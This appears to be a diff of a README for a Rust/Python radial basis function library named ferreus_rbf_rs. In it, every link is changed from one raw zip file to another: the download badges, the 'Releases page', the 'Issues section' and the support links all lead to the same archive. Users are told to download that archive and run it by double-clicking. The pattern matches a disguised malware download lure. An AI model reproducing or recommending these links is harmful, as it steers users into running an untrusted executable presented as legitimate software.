@@ -1,6 +1,6 @@
 # 🌟 ferreus_rbf_rs - Fast and Easy Radial Basis Function Interpolation
 
-[![Download](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip)
+[![Download](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To start using **ferreus_rbf_rs**, follow these simple steps:
 
 1. **Download the Software**: 
 
-   Visit the [Releases page](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip) to download the latest version. 
+   Visit the [Releases page](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip) to download the latest version. 
 
 2. **Install the Software**: 
    
@@ -26,7 +26,7 @@ To start using **ferreus_rbf_rs**, follow these simple steps:
 
 To get the software, follow these steps:
 
-- Go to the [Releases page](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip).
+- Go to the [Releases page](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip).
 - Click on the version you want to download. This will usually be the latest version.
 - Download the file that matches your operating system.
 - After downloading, locate the file and run it by double-clicking.
@@ -70,21 +70,21 @@ A: No, the software is designed for all users, regardless of their programming b
 A: As long as you meet the system requirements, you can run the software on your computer.
 
 **Q: How do I connect with the community?**  
-A: Join our user groups on social media platforms. You can also find discussion forums in the [Issues section](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip).
+A: Join our user groups on social media platforms. You can also find discussion forums in the [Issues section](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip).
 
 ## 📞 Support
 
 If you encounter any issues while using **ferreus_rbf_rs**, our support team is here to help. You can reach us by:
 
-1. Visiting the [Issues section](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip) on GitHub.
+1. Visiting the [Issues section](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip) on GitHub.
 2. Submitting a query via our official contact email.
 
 ## 🐛 Reporting Issues
 
-If you find bugs or issues within the software, please report them using the [Issues section](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip). Providing clear details will help us assist you better.
+If you find bugs or issues within the software, please report them using the [Issues section](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip). Providing clear details will help us assist you better.
 
 ## 🌐 Learn More
 
 For more information, tutorials, and guides, visit our website or check additional resources linked from our GitHub page. Engage with other users and learn how to utilize the software effectively.
 
-[![Download](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_rbf/examples/ferreus_rbf_rs_1.0.zip)
+[![Download](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Githaozoizj/ferreus_rbf_rs/main/py_ferreus_bbfmm/docs/rs_ferreus_rbf_v3.2-alpha.2.zip)
